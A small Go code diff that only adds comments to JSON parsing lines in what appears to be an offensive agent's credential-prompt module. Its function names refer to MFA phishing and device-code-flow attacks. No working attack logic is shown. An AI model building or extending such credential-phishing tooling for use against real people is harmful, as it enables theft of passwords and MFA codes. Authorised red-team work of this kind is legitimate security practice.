@@ -22,7 +22,7 @@ func credPromptExtractAction(params string) string {
 	var a struct {
 		Action string `json:"action"`
 	}
-	_ = json.Unmarshal([]byte(params), &a)
+	_ = json.Unmarshal([]byte(params), &a) // best-effort; unknown action routes to default handler
 	return strings.ToLower(a.Action)
 }
 
@@ -99,7 +99,7 @@ func credPromptMFAPhishResult(code, title, username, platform string) structs.Co
 func credPromptDeviceCodeFlow(task structs.Task) structs.CommandResult {
 	var args credPromptMFAArgs
 	if task.Params != "" {
-		_ = json.Unmarshal([]byte(task.Params), &args)
+		_ = json.Unmarshal([]byte(task.Params), &args) // best-effort; proceed with defaults on error
 	}
 
 	tenantID := args.TenantID
